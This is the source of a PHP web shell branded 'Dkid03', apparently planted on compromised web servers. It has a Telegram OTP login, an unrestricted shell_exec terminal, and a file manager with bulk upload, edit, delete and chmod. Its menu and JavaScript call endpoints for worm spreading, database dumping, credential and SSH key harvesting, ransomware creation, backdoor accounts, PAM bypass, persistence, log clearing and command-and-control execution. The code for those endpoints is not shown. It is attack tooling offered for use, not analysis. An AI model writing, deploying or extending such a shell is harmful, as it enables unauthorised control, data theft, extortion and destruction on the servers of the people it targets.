    $message = "🔑 <b>Kode OTP Anda:</b>\n\n<code>$otp</code>\n\n⏱️ Berlaku 5 menit.";
    $sent = sendTelegramMessage($botToken, $telegramUserId, $message);
    if ($sent) $loginSuccess = "✅ OTP telah dikirim ke Telegram.";
    else { 
        $loginError = "❌ Gagal mengirim OTP."; 
        unset($_SESSION['otp']); 
    }
}
if (isset($_POST['verify_otp'])) {
    $inputOtp = trim($_POST['otp'] ?? '');
    if (empty($inputOtp)) $loginError = "Masukkan kode OTP.";
    elseif (!isset($_SESSION['otp']) || !isset($_SESSION['otp_time'])) $loginError = "Minta OTP dulu.";
    elseif (time() - $_SESSION['otp_time'] > 300) { 
        $loginError = "❌ Kode kadaluarsa."; 
        unset($_SESSION['otp'], $_SESSION['otp_time']); 
    } elseif ($inputOtp === $_SESSION['otp']) { 
        $_SESSION['loggedin'] = true; 
        $_SESSION['login_time'] = time(); 
        unset($_SESSION['otp'], $_SESSION['otp_time']); 
        header('Location: ?'); 
        exit; 
    } else $loginError = "❌ Kode OTP salah.";
}

// ==================== AREA LOGGED IN ====================
if (isset($_SESSION['loggedin'])) {
    if (time() - $_SESSION['login_time'] > 1800) { 
        session_destroy(); 
        header('Location: ?'); 
        exit; 
    }
    telegram_command_handler($botToken, $telegramUserId);
    $currentPath = $rootPath;
    if (isset($_GET['path'])) {
        $requestedPath = realpath($_GET['path']);
        if ($requestedPath && isSafePath($requestedPath, $rootPath, $specialDirectories)) $currentPath = $requestedPath;
        else $error = "Path tidak valid atau di luar direktori yang diizinkan";
    }
    if (!file_exists($currentPath) || !is_dir($currentPath) || !is_readable($currentPath)) { 
        $error = "Direktori tidak dapat diakses"; 
        $currentPath = $rootPath; 
    }

    // ===== FILE MANAGER OPERATIONS =====
    if (isset($_POST['rename'])) {
        try {
            $target = $_POST['target'] ?? ''; $newName = $_POST['new_name'] ?? '';
            if (empty($target) || empty($newName) || preg_match('/[\/\\\\:\*\?"<>\|]/', $newName)) throw new Exception('Nama tidak valid');
            $targetPath = $currentPath . DIRECTORY_SEPARATOR . $target;
            $newPath = $currentPath . DIRECTORY_SEPARATOR . $newName;
            if (!file_exists($targetPath) || !isSafePath($targetPath, $rootPath, $specialDirectories) || !@rename($targetPath, $newPath)) throw new Exception('Gagal mengganti nama');
            header('Location: ?path=' . urlencode($currentPath));
            exit;
        } catch (Exception $e) { $error = $e->getMessage(); }
    }
    if (isset($_GET['action'])) {
        try {
            $action = $_GET['action']; $target = $_GET['target'] ?? ''; $targetPath = $currentPath . DIRECTORY_SEPARATOR . $target;
            if (empty($target) || !file_exists($targetPath) || !isSafePath($targetPath, $rootPath, $specialDirectories)) throw new Exception('Target tidak valid');
            switch ($action) {
                case 'delete': deleteDirectory($targetPath) ?: throw new Exception('Gagal menghapus'); break;
                case 'chmod':
                    if (!isset($_POST['mode']) || !preg_match('/^[0-7]{3,4}$/', $_POST['mode'])) throw new Exception('Mode permission tidak valid');
                    @chmod($targetPath, octdec($_POST['mode'])) ?: throw new Exception('Gagal mengubah permission');
                    break;
                case 'unzip':
                    if (!class_exists('ZipArchive')) throw new Exception('Ekstensi Zip tidak tersedia');
                    $zip = new ZipArchive;
                    if ($zip->open($targetPath) === TRUE) { $zip->extractTo($currentPath); $zip->close(); }
                    else throw new Exception('Gagal membuka file zip');
                    break;
                case 'download':
                    if (is_dir($targetPath)) throw new Exception('Tidak dapat mendownload direktori');
                    header('Content-Description: File Transfer');
                    header('Content-Type: application/octet-stream');
                    header('Content-Disposition: attachment; filename="' . basename($targetPath) . '"');
                    header('Content-Length: ' . filesize($targetPath));
                    readfile($targetPath);
                    exit;
                default: throw new Exception('Aksi tidak dikenali');
            }
            $success = 'Berhasil melakukan aksi: ' . htmlspecialchars($target);
            header('Location: ?path=' . urlencode($currentPath));
            exit;
        } catch (Exception $e) { $error = $e->getMessage(); }
    }
    if (isset($_POST['create'])) {
        try {
            $type = $_POST['type']; $name = $_POST['name'] ?? '';
            if (empty($name) || preg_match('/[\/\\\\:\*\?"<>\|]/', $name)) throw new Exception('Nama tidak valid');
            $newPath = $currentPath . DIRECTORY_SEPARATOR . $name;
            if ($type === 'file') { @touch($newPath) ?: throw new Exception('Gagal membuat file'); }
            elseif ($type === 'folder') { @mkdir($newPath) ?: throw new Exception('Gagal membuat folder'); }
            header('Location: ?path=' . urlencode($currentPath));
            exit;
        } catch (Exception $e) { $error = $e->getMessage(); }
    }
    if (isset($_FILES['upload'])) {
        try {
            if (!is_writable($currentPath)) throw new Exception('Direktori tidak dapat ditulisi');
            $mode = $_POST['upload_mode'] ?? 'normal';
            $targetDirs = [$currentPath];
            if ($mode === 'bulk_shallow') $targetDirs = array_merge($targetDirs, getImmediateSubDirectories($currentPath));
            elseif ($mode === 'bulk_deep') $targetDirs = array_merge($targetDirs, getAllSubDirectories($currentPath));
            $targetDirs = array_filter($targetDirs, 'is_writable');
            $uploadedFiles = [];
            foreach ($_FILES['upload']['name'] as $key => $name) {
                if ($_FILES['upload']['error'][$key] !== UPLOAD_ERR_OK) continue;
                $safeName = basename($name);
                $mainTarget = $currentPath . DIRECTORY_SEPARATOR . $safeName;
                if (!@move_uploaded_file($_FILES['upload']['tmp_name'][$key], $mainTarget)) continue;
                foreach ($targetDirs as $dir) if ($dir !== $currentPath) @copy($mainTarget, $dir . DIRECTORY_SEPARATOR . $safeName);
                $uploadedFiles[] = $safeName;
            }
            $success = '✅ File berhasil diupload: ' . implode(', ', $uploadedFiles ?? []);
        } catch (Exception $e) { $error = $e->getMessage(); }
    }
    if (isset($_POST['delete_bulk'])) {
        try {
            $fileList = $_POST['file_list'] ?? ''; $deleteMode = $_POST['delete_mode'] ?? 'current';
            if (empty(trim($fileList))) throw new Exception('Daftar file tidak boleh kosong');
            $results = bulkDeleteFiles($currentPath, $fileList, $deleteMode);
            $msgParts = [];
            if (!empty($results['deleted'])) $msgParts[] = 'Terhapus: ' . count($results['deleted']) . ' file';
            if (!empty($results['not_found'])) $msgParts[] = 'Tidak ditemukan: ' . implode(', ', array_unique($results['not_found']));
            if (!empty($results['errors'])) $msgParts[] = 'Gagal dihapus: ' . count($results['errors']) . ' file';
            $success = '✅ Hasil hapus massal: ' . implode('; ', $msgParts);
        } catch (Exception $e) { $error = $e->getMessage(); }
    }
    if (isset($_POST['save_file'])) {
        try {
            $file = $_POST['file'];
            $filePath = $currentPath . DIRECTORY_SEPARATOR . $file;
            if (!file_exists($filePath) || !is_file($filePath) || !isSafePath($filePath, $rootPath, $specialDirectories)) throw new Exception('File tidak valid');
            if (!is_writable($filePath)) throw new Exception('File tidak dapat ditulisi');
            @file_put_contents($filePath, $_POST['content']) !== false ?: throw new Exception('Gagal menyimpan file');
            $success = '✅ File berhasil disimpan';
        } catch (Exception $e) { $error = $e->getMessage(); }
    }
    $terminalActive = isTerminalActive();
    $terminalOutput = '';
    if (isset($_POST['run_command']) && $terminalActive) {
        $output = @shell_exec($_POST['command'] . ' 2>&1');
        $terminalOutput = $output !== null ? $output : 'Perintah tidak menghasilkan output.';
    }
}

// ==================== HTML (UI RINGAN & MODERN) ====================
?>
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dkid03</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root {
            --bg: #0d1117;
            --bg-card: #161b22;
            --bg-hover: #1f242f;
            --text: #c9d1d9;
            --text-muted: #8b949e;
            --accent: #58a6ff;
            --border: #30363d;
            --danger: #f85149;
            --success: #3fb950;
            --warning: #d29922;
            --radius: 6px;
        }
        * { margin:0; padding:0; box-sizing:border-box; }
        body { background:var(--bg); color:var(--text); font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif; line-height:1.6; min-height:100vh; }
        a { color:var(--accent); text-decoration:none; }
        a:hover { text-decoration:underline; }

        .login-container { display:flex; align-items:center; justify-content:center; min-height:100vh; padding:20px; }
        .login-box { background:var(--bg-card); padding:30px; border-radius:var(--radius); border:1px solid var(--border); max-width:400px; width:100%; }
        .login-title { text-align:center; margin-bottom:20px; font-size:1.5rem; font-weight:600; color:var(--accent); }

        .app-container { display:flex; min-height:100vh; }
        .main-content { flex:1; padding:20px; margin-left:220px; }
        @media(max-width:768px){ .main-content { margin-left:0; padding:10px; } }

        .sidebar { width:220px; background:var(--bg-card); border-right:1px solid var(--border); height:100vh; position:fixed; top:0; left:0; overflow-y:auto; display:flex; flex-direction:column; z-index:100; }
        .sidebar-header { padding:15px; border-bottom:1px solid var(--border); }
        .sidebar-title { font-size:1.1rem; font-weight:600; color:var(--accent); }
        .sidebar-subtitle { font-size:0.7rem; color:var(--text-muted); word-break:break-all; }
        .sidebar-menu { padding:10px; flex:1; }
        .menu-section { margin-bottom:12px; }
        .menu-title { font-size:0.6rem; text-transform:uppercase; letter-spacing:0.5px; color:var(--text-muted); padding:0 8px; margin-bottom:4px; }
        .menu-item { display:flex; align-items:center; gap:10px; padding:6px 12px; border-radius:var(--radius); color:var(--text); cursor:pointer; transition:0.2s; font-size:0.8rem; background:transparent; border:none; width:100%; text-align:left; }
        .menu-item:hover { background:var(--bg-hover); color:var(--accent); }
        .menu-item i { width:18px; text-align:center; font-size:0.85rem; }
        .logout-btn { color:var(--danger); margin-top:auto; }
        .logout-btn:hover { background:rgba(248,81,73,0.1); color:var(--danger); }
        .menu-toggle { display:none; position:fixed; top:10px; left:10px; z-index:999; background:var(--bg-card); border:1px solid var(--border); color:var(--text); border-radius:var(--radius); padding:8px 12px; cursor:pointer; font-size:0.9rem; }
        @media(max-width:768px){ .menu-toggle { display:block; } .sidebar { transform:translateX(-100%); width:260px; } .sidebar.active { transform:translateX(0); } }

        .card { background:var(--bg-card); border-radius:var(--radius); border:1px solid var(--border); margin-bottom:12px; overflow:hidden; }
        .card-header { padding:10px 14px; border-bottom:1px solid var(--border); font-weight:500; display:flex; justify-content:space-between; align-items:center; font-size:0.85rem; }
        .card-body { padding:10px 14px; max-height:55vh; overflow-y:auto; }

        .table { width:100%; border-collapse:collapse; font-size:0.8rem; }
        .table th { text-align:left; padding:6px 8px; border-bottom:1px solid var(--border); color:var(--text-muted); font-weight:500; position:sticky; top:0; background:var(--bg-card); }
        .table td { padding:4px 8px; border-bottom:1px solid var(--border); }
        .table tr:hover td { background:var(--bg-hover); }
        .folder { color:var(--accent); }
        .file { color:var(--text); }
        .file-icon { margin-right:4px; }
        .action-links { display:flex; gap:4px; flex-wrap:wrap; }
        .action-links a { font-size:0.7rem; color:var(--text-muted); padding:2px 6px; border-radius:4px; background:rgba(255,255,255,0.04); transition:0.2s; }
        .action-links a:hover { color:var(--accent); background:rgba(88,166,255,0.1); }

        .breadcrumb { padding:6px 0; font-size:0.75rem; color:var(--text-muted); overflow-x:auto; white-space:nowrap; }
        .breadcrumb a { color:var(--accent); }

        .form-group { margin-bottom:10px; }
        .form-group label { display:block; margin-bottom:3px; font-size:0.8rem; font-weight:500; }
        .form-control { width:100%; padding:6px 10px; background:var(--bg); border:1px solid var(--border); border-radius:var(--radius); color:var(--text); font-size:0.85rem; transition:0.2s; }
        .form-control:focus { outline:none; border-color:var(--accent); box-shadow:0 0 0 3px rgba(88,166,255,0.15); }
        .btn { display:inline-block; padding:6px 14px; background:var(--bg); border:1px solid var(--border); border-radius:var(--radius); color:var(--text); cursor:pointer; font-size:0.8rem; transition:0.2s; text-align:center; }
        .btn:hover { background:var(--bg-hover); border-color:var(--accent); color:var(--accent); }
        .btn-block { display:block; width:100%; }
        .btn-success { border-color:var(--success); color:var(--success); }
        .btn-success:hover { background:rgba(63,185,80,0.1); }
        .btn-danger { border-color:var(--danger); color:var(--danger); }
        .btn-danger:hover { background:rgba(248,81,73,0.1); }
        .btn-warning { border-color:var(--warning); color:var(--warning); }
        .btn-warning:hover { background:rgba(210,153,34,0.1); }

        .modal { position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.7); display:flex; align-items:center; justify-content:center; z-index:1000; opacity:0; visibility:hidden; transition:0.25s; }
        .modal.active { opacity:1; visibility:visible; }
        .modal-content { background:var(--bg-card); border-radius:var(--radius); max-width:500px; width:95%; max-height:90vh; overflow-y:auto; border:1px solid var(--border); transform:translateY(15px); transition:0.25s; }
        .modal.active .modal-content { transform:translateY(0); }
        .modal-header { padding:12px 16px; border-bottom:1px solid var(--border); display:flex; justify-content:space-between; align-items:center; }
        .modal-title { font-size:1rem; font-weight:600; color:var(--accent); }
        .modal-close { background:none; border:none; color:var(--text-muted); font-size:1.2rem; cursor:pointer; padding:0 4px; }
        .modal-close:hover { color:var(--text); }
        .modal-body { padding:16px; }

        .terminal-output { background:var(--bg); padding:10px; border-radius:var(--radius); font-family:'Courier New',monospace; font-size:0.75rem; max-height:250px; overflow-y:auto; white-space:pre-wrap; word-break:break-all; border:1px solid var(--border); margin-bottom:8px; }
        .terminal-input { display:flex; gap:6px; flex-wrap:wrap; }
        .terminal-input .form-control { flex:1; min-width:120px; }

        .alert { padding:8px 12px; border-radius:var(--radius); margin-bottom:10px; font-size:0.85rem; }
        .alert-danger { background:rgba(248,81,73,0.1); border:1px solid var(--danger); color:var(--danger); }
        .alert-success { background:rgba(63,185,80,0.1); border:1px solid var(--success); color:var(--success); }

        ::-webkit-scrollbar { width:5px; height:5px; }
        ::-webkit-scrollbar-track { background:var(--bg); }
        ::-webkit-scrollbar-thumb { background:var(--border); border-radius:3px; }
        ::-webkit-scrollbar-thumb:hover { background:var(--text-muted); }

        @media(max-width:480px){
            .table { font-size:0.7rem; }
            .table th, .table td { padding:3px 5px; }
            .action-links a { font-size:0.6rem; }
        }
    </style>
</head>
<body>
    <?php if (!isset($_SESSION['loggedin'])): ?>
        <div class="login-container">
            <div class="login-box">
                <h1 class="login-title">💀 Dkid03</h1>
                <?php if (!empty($loginError)): ?>
                    <div class="alert alert-danger"><?= htmlspecialchars($loginError) ?></div>
                <?php endif; ?>
                <?php if (!empty($loginSuccess)): ?>
                    <div class="alert alert-success"><?= htmlspecialchars($loginSuccess) ?></div>
                <?php endif; ?>
                <?php if (isset($_SESSION['logout_success'])): ?>
                    <div class="alert alert-success">✅ Anda berhasil logout <?php unset($_SESSION['logout_success']); ?></div>
                <?php endif; ?>
                <form method="post">
                    <div class="form-group">
                        <button type="submit" name="request_otp" class="btn btn-block"><i class="fab fa-telegram"></i> Kirim OTP ke Telegram</button>
                    </div>
                </form>
                <?php if (isset($_SESSION['otp'])): ?>
                <hr style="border-color:var(--border); margin:15px 0;">
                <form method="post">
                    <div class="form-group">
                        <label for="otp">Masukkan Kode OTP</label>
                        <input type="text" id="otp" name="otp" class="form-control" placeholder="6 digit" maxlength="6" required>
                    </div>
                    <button type="submit" name="verify_otp" class="btn btn-block">🔑 Login</button>
                </form>
                <?php endif; ?>
                <div style="margin-top:12px;text-align:center;">
                    <a href="?action=Dkid" style="color:var(--warning);">🚨 Login Darurat</a>
                </div>
            </div>
        </div>
    <?php else: ?>
        <div class="app-container">
            <button class="menu-toggle" onclick="document.querySelector('.sidebar').classList.toggle('active')">
                <i class="fas fa-bars"></i>
            </button>
            <div class="sidebar">
                <div class="sidebar-header">
                    <h2 class="sidebar-title">💀 Dkid03</h2>
                    <p class="sidebar-subtitle"><?= htmlspecialchars($currentPath) ?></p>
                </div>
                <div class="sidebar-menu">
                    <div class="menu-section">
                        <div class="menu-title">📁 File</div>
                        <a href="?" class="menu-item"><i class="fas fa-folder"></i> Manager</a>
                        <div class="menu-item" onclick="showModal('uploadModal')"><i class="fas fa-upload"></i> Upload</div>
                        <div class="menu-item" onclick="showModal('createModal')"><i class="fas fa-file"></i> File</div>
                        <div class="menu-item" onclick="showModal('createFolderModal')"><i class="fas fa-folder"></i> Folder</div>
                        <div class="menu-item" onclick="showModal('bulkDeleteModal')"><i class="fas fa-trash-alt"></i> Bulk Delete</div>
                    </div>
                    <div class="menu-section">
                        <div class="menu-title">⚡ System</div>
                        <a href="?terminal" class="menu-item"><i class="fas fa-terminal"></i> Terminal</a>
                        <div class="menu-item" onclick="runWorm()"><i class="fas fa-bug"></i> Worm</div>
                        <div class="menu-item" onclick="runDump()"><i class="fas fa-database"></i> Dump DB</div>
                        <div class="menu-item" onclick="runHarvest()"><i class="fas fa-key"></i> Harvest</div>
                        <div class="menu-item" onclick="runCpanel()"><i class="fas fa-server"></i> cPanel</div>
                        <div class="menu-item" onclick="runConfigFinder()"><i class="fas fa-file-alt"></i> Sensitive</div>
                        <div class="menu-item" onclick="runCreateRansom()"><i class="fas fa-skull"></i> Ransom</div>
                        <div class="menu-item" onclick="runWPScan()"><i class="fab fa-wordpress"></i> WP Scan</div>
                        <div class="menu-item" onclick="runSSHKeys()"><i class="fas fa-key"></i> SSH Keys</div>
                        <div class="menu-item" onclick="runBackdoorUser()"><i class="fas fa-user-plus"></i> Backdoor User</div>
                    </div>
                    <div class="menu-section">
                        <div class="menu-title">🛡️ Security</div>
                        <div class="menu-item" onclick="runSelfDestruct()"><i class="fas fa-skull-crossbones"></i> Self-Destruct</div>
                        <div class="menu-item" onclick="runAntiForensic()"><i class="fas fa-broom"></i> Anti-Forensic</div>
                        <div class="menu-item" onclick="runBypassSuhosin()"><i class="fas fa-shield-alt"></i> Bypass Suhosin</div>
                        <div class="menu-item" onclick="runCreateFTP()"><i class="fas fa-folder-open"></i> FTP Account</div>
                        <div class="menu-item" onclick="runCreateMail()"><i class="fas fa-envelope"></i> Mail Account</div>
                        <div class="menu-item" onclick="runDeepPersistence('install')"><i class="fas fa-shield-alt"></i> Deep Persistence</div>
                        <div class="menu-item" onclick="runDeepPersistence('remove')"><i class="fas fa-shield-alt"></i> Remove Deep Persistence</div>
                        <div class="menu-item" onclick="runPamBypass('install')"><i class="fas fa-key"></i> PAM Bypass</div>
                        <div class="menu-item" onclick="runPamBypass('remove')"><i class="fas fa-key"></i> Remove PAM Bypass</div>
                        <div class="menu-item" onclick="runUserPersistence('install')"><i class="fas fa-user"></i> User Persistence</div>
                        <div class="menu-item" onclick="runUserPersistence('remove')"><i class="fas fa-user"></i> Remove User Persistence</div>
                        <div class="menu-item" onclick="runListSpread()"><i class="fas fa-list"></i> List Spread</div>
                        <div class="menu-item" onclick="runSystemCache()"><i class="fas fa-sync-alt"></i> Cache Repair</div>
                        <div class="menu-item" onclick="runClearLogs()"><i class="fas fa-eraser"></i> Clear Logs</div>
                    </div>
                    <div class="menu-section">
                        <div class="menu-title">📡 C2</div>
                        <div class="menu-item" onclick="runExecAll()"><i class="fas fa-broadcast"></i> Exec All</div>
                        <div class="menu-item" onclick="runLsAll()"><i class="fas fa-broadcast"></i> LS All</div>
                    </div>
                    <div class="menu-section">
                        <div class="menu-title">🚪 Exit</div>
                        <a href="?logout" class="menu-item logout-btn"><i class="fas fa-sign-out-alt"></i> Logout</a>
                    </div>
                </div>
            </div>

            <div class="main-content">
                <?php if (isset($_GET['terminal'])): ?>
                    <div class="terminal-container">
                        <?php $sysInfo = getSystemInfo(); ?>
                        <div class="card">
                            <div class="card-header"><span>📊 System Info</span></div>
                            <div class="card-body">
                                <?php foreach ($sysInfo as $label => $value): ?>
                                <div style="display:flex;border-bottom:1px solid var(--border);padding:4px 0;font-size:0.8rem;">
                                    <span style="width:140px;color:var(--text-muted);"><?= htmlspecialchars($label) ?>:</span>
                                    <span><?= htmlspecialchars($value) ?></span>
                                </div>
                                <?php endforeach; ?>
                            </div>
                        </div>
                        <div class="card">
                            <div class="card-header"><span>🖥️ Terminal</span></div>
                            <div class="card-body">
                                <?php if (!$terminalActive): ?>
                                    <div class="alert alert-danger">❌ Terminal tidak aktif.</div>
                                <?php endif; ?>
                                <div class="terminal-output"><?= htmlspecialchars($terminalOutput) ?: '✅ Ready.' ?></div>
                                <form method="post" class="terminal-input">
                                    <input type="text" name="command" class="form-control" placeholder="ls -la" autocomplete="off" <?= $terminalActive ? '' : 'disabled' ?>>
                                    <button type="submit" name="run_command" class="btn" <?= $terminalActive ? '' : 'disabled' ?>>▶ Run</button>
                                </form>
                            </div>
                        </div>
                    </div>
                <?php else: ?>
                    <div style="margin-bottom:12px;">
                        <h1 style="font-size:1.3rem;font-weight:500;color:var(--accent);text-align:center;">🔹 Dkid03 Access</h1>
                    </div>
                    <?php if (isset($error)): ?>
                        <div class="alert alert-danger">❌ <?= htmlspecialchars($error) ?></div>
                    <?php endif; ?>
                    <?php if (isset($success)): ?>
                        <div class="alert alert-success">✅ <?= htmlspecialchars($success) ?></div>
                    <?php endif; ?>
                    <div class="breadcrumb">
                        <?= breadcrumb($currentPath, $rootPath, $specialDirectories) ?>
                    </div>
                    <div class="card">
                        <div class="card-header">
                            <span>📂 Files</span>
                            <span><?= count(scandir($currentPath)) - 2 ?> items</span>
                        </div>
                        <div class="card-body">
                            <table class="table">
                                <thead><tr><th>Name</th><th>Size</th><th>Perm</th><th>Actions</th></tr></thead>
                                <tbody>
                                    <?php if ($currentPath !== $rootPath || !empty($specialDirectories)): ?>
                                        <tr><td><a href="?path=<?= urlencode(dirname($currentPath)) ?>" class="folder">📁 ..</a></td><td>-</td><td>-</td><td>-</td></tr>
                                    <?php endif; ?>
                                    <?php
                                    $items = @scandir($currentPath) ?: [];
                                    foreach ($items as $item) {
                                        if ($item === '.' || $item === '..') continue;
                                        $itemPath = $currentPath . DIRECTORY_SEPARATOR . $item;
                                        $isDir = is_dir($itemPath);
                                        $size = $isDir ? '-' : formatSize(@filesize($itemPath));
                                        $perms = @fileperms($itemPath);
                                        $permsFormatted = $perms ? substr(sprintf('%o', $perms), -4) : 'Error';
                                    ?>
                                        <tr>
                                            <td>
                                                <?php if ($isDir): ?>
                                                    <a href="?path=<?= urlencode($itemPath) ?>" class="folder"><i class="fas fa-folder file-icon"></i><?= htmlspecialchars($item) ?></a>
                                                <?php else: ?>
                                                    <span class="file"><i class="fas fa-file file-icon"></i><?= htmlspecialchars($item) ?></span>
                                                <?php endif; ?>
                                            </td>
                                            <td><?= $size ?></td>
                                            <td><?= $permsFormatted ?></td>
                                            <td class="action-links">
                                                <?php if (!$isDir && in_array(strtolower(pathinfo($item, PATHINFO_EXTENSION)), $editableExtensions) && $item !== basename(__FILE__)): ?>
                                                    <a href="#" onclick="editFile('<?= htmlspecialchars($item) ?>')">✏️ Edit</a>
                                                <?php endif; ?>
                                                <a href="#" onclick="showRename('<?= htmlspecialchars($item) ?>')">✏️ Rename</a>
                                                <a href="?path=<?= urlencode($currentPath) ?>&action=download&target=<?= urlencode($item) ?>">⬇️ DL</a>
                                                <a href="?path=<?= urlencode($currentPath) ?>&action=delete&target=<?= urlencode($item) ?>" onclick="return confirm('Yakin?')" style="color:var(--danger);">🗑️ Del</a>
                                                <?php if (!$isDir && strtolower(pathinfo($item, PATHINFO_EXTENSION)) === 'zip'): ?>
                                                    <a href="?path=<?= urlencode($currentPath) ?>&action=unzip&target=<?= urlencode($item) ?>">📦 Unzip</a>
                                                <?php endif; ?>
                                                <a href="#" onclick="showChmod('<?= htmlspecialchars($item) ?>', '<?= $permsFormatted ?>')">🔒 CHMOD</a>
                                            </td>
                                        </tr>
                                    <?php } ?>
                                </tbody>
                            </table>
                        </div>
                    </div>
                <?php endif; ?>
            </div>
        </div>

        <!-- MODALS -->
        <div id="createModal" class="modal">
            <div class="modal-content">
                <div class="modal-header"><h2 class="modal-title">📄 New File</h2><button class="modal-close" onclick="hideModal('createModal')">&times;</button></div>
                <div class="modal-body">
                    <form method="post">
                        <div class="form-group"><label>File Name</label><input type="text" name="name" class="form-control" required></div>
                        <input type="hidden" name="type" value="file"><input type="hidden" name="create" value="1">
                        <button type="submit" class="btn btn-block">✅ Create</button>
                    </form>
                </div>
            </div>
        </div>
        <div id="createFolderModal" class="modal">
            <div class="modal-content">
                <div class="modal-header"><h2 class="modal-title">📁 New Folder</h2><button class="modal-close" onclick="hideModal('createFolderModal')">&times;</button></div>
                <div class="modal-body">
                    <form method="post">
                        <div class="form-group"><label>Folder Name</label><input type="text" name="name" class="form-control" required></div>
                        <input type="hidden" name="type" value="folder"><input type="hidden" name="create" value="1">
                        <button type="submit" class="btn btn-block">✅ Create</button>
                    </form>
                </div>
            </div>
        </div>
        <div id="uploadModal" class="modal">
            <div class="modal-content">
                <div class="modal-header"><h2 class="modal-title">📤 Upload</h2><button class="modal-close" onclick="hideModal('uploadModal')">&times;</button></div>
                <div class="modal-body">
                    <form method="post" enctype="multipart/form-data">
                        <div class="form-group"><input type="file" name="upload[]" class="form-control" multiple required></div>
                        <div class="form-group">
                            <label><input type="radio" name="upload_mode" value="normal" checked> Normal</label>
                            <label><input type="radio" name="upload_mode" value="bulk_shallow"> Shallow</label>
                            <label><input type="radio" name="upload_mode" value="bulk_deep"> Deep</label>
                        </div>
                        <button type="submit" class="btn btn-block">📤 Upload</button>
                    </form>
                </div>
            </div>
        </div>
        <div id="bulkDeleteModal" class="modal">
            <div class="modal-content">
                <div class="modal-header"><h2 class="modal-title">🗑️ Bulk Delete</h2><button class="modal-close" onclick="hideModal('bulkDeleteModal')">&times;</button></div>
                <div class="modal-body">
                    <form method="post">
                        <div class="form-group"><textarea name="file_list" class="form-control" rows="4" placeholder="file1.php&#10;file2.txt" required></textarea></div>
                        <div class="form-group">
                            <label><input type="radio" name="delete_mode" value="current" checked> Current</label>
                            <label><input type="radio" name="delete_mode" value="shallow"> Shallow</label>
                            <label><input type="radio" name="delete_mode" value="deep"> Deep</label>
                        </div>
                        <button type="submit" name="delete_bulk" class="btn btn-block btn-danger" onclick="return confirm('Yakin?')">🗑️ Delete</button>
                    </form>
                </div>
            </div>
        </div>
        <div id="editModal" class="modal">
            <div class="modal-content">
                <div class="modal-header"><h2 class="modal-title">✏️ Edit</h2><button class="modal-close" onclick="hideModal('editModal')">&times;</button></div>
                <div class="modal-body">
                    <form method="post">
                        <div class="form-group"><textarea id="fileContent" name="content" class="form-control" style="min-height:200px;font-family:monospace;"></textarea></div>
                        <input type="hidden" id="editFileName" name="file"><input type="hidden" name="save_file" value="1">
                        <button type="submit" class="btn btn-block">💾 Save</button>
                    </form>
                </div>
            </div>
        </div>
        <div id="renameModal" class="modal">
            <div class="modal-content">
                <div class="modal-header"><h2 class="modal-title">✏️ Rename</h2><button class="modal-close" onclick="hideModal('renameModal')">&times;</button></div>
                <div class="modal-body">
                    <form method="post">
                        <div class="form-group"><input type="text" id="newName" name="new_name" class="form-control" required></div>
                        <input type="hidden" id="renameTarget" name="target"><input type="hidden" name="rename" value="1">
                        <button type="submit" class="btn btn-block">✅ Rename</button>
                    </form>
                </div>
            </div>
        </div>
        <div id="chmodModal" class="modal">
            <div class="modal-content">
                <div class="modal-header"><h2 class="modal-title">🔒 CHMOD</h2><button class="modal-close" onclick="hideModal('chmodModal')">&times;</button></div>
                <div class="modal-body">
                    <form method="post">
                        <div class="form-group"><input type="text" id="permission" name="mode" class="form-control" placeholder="0644" required></div>
                        <input type="hidden" id="chmodTarget" name="target"><input type="hidden" name="action" value="chmod">
                        <button type="submit" class="btn btn-block">✅ Change</button>
                    </form>
                </div>
            </div>
        </div>

        <script>
            function showModal(id){document.getElementById(id).classList.add('active');}
            function hideModal(id){document.getElementById(id).classList.remove('active');}
            function editFile(f){if(f==='<?= basename(__FILE__) ?>'){alert('⚠️ Tidak bisa mengedit file ini.');return;}fetch('?path=<?= urlencode($currentPath) ?>&edit='+encodeURIComponent(f)).then(r=>r.text()).then(d=>{document.getElementById('fileContent').value=d;document.getElementById('editFileName').value=f;showModal('editModal');}).catch(()=>alert('Error'));}
            function showRename(n){if(n){document.getElementById('newName').value=n;document.getElementById('renameTarget').value=n;showModal('renameModal');}}
            function showChmod(n,p){if(n){document.getElementById('permission').value=p;document.getElementById('chmodTarget').value=n;showModal('chmodModal');}}

            function runWorm(){if(confirm('Yakin?')){fetch('?worm=1').then(r=>r.text()).then(d=>alert(d)).catch(()=>alert('Error'));}}
            function runDump(){if(confirm('Dump database?')){fetch('?dumpdb_send=1').then(r=>r.text()).then(d=>alert(d)).catch(()=>alert('Error'));}}
            function runHarvest(){if(confirm('Harvest?')){fetch('?harvest=1').then(r=>r.text()).then(d=>alert(d)).catch(()=>alert('Error'));}}
            function runCpanel(){var a=prompt('cPanel: list, create [user domain pass plan], passwd [user pass], backup [user], delete [user keep]');if(a){var p=a.split(' ');fetch('?cpanel=1&action='+encodeURIComponent(p[0])+'&user='+encodeURIComponent(p[1]||'')+'&extra='+encodeURIComponent(p.slice(2).join(' '))).then(r=>r.text()).then(d=>alert(d)).catch(()=>alert('Error'));}}
            function runConfigFinder(){if(confirm('Cari file sensitif?')){fetch('?configfinder=1').then(r=>r.text()).then(d=>alert(d)).catch(()=>alert('Error'));}}
            function runCreateRansom(){if(confirm('Buat ransomware?')){fetch('?create_ransom=1').then(r=>r.text()).then(d=>alert(d)).catch(()=>alert('Error'));}}
            function runWPScan(){if(confirm('Scan WP/Laravel?')){fetch('?wpscan=1').then(r=>r.text()).then(d=>alert(d)).catch(()=>alert('Error'));}}
            function runSSHKeys(){if(confirm('Ambil SSH keys?')){fetch('?sshkeys=1').then(r=>r.text()).then(d=>alert(d)).catch(()=>alert('Error'));}}
            function runBackdoorUser(){var u=prompt('Username:');if(u){var p=prompt('Password:');fetch('?backdooruser=1&user='+encodeURIComponent(u)+'&pass='+encodeURIComponent(p||'')).then(r=>r.text()).then(d=>alert(d)).catch(()=>alert('Error'));}}
            function runSystemCache(){if(confirm('Cache repair?')){fetch('?cache_repair=1').then(r=>r.text()).then(d=>alert(d)).catch(()=>alert('Error'));}}
            function runClearLogs(){if(confirm('Clear logs?')){fetch('?clearlogs=1').then(r=>r.text()).then(d=>alert(d)).catch(()=>alert('Error'));}}
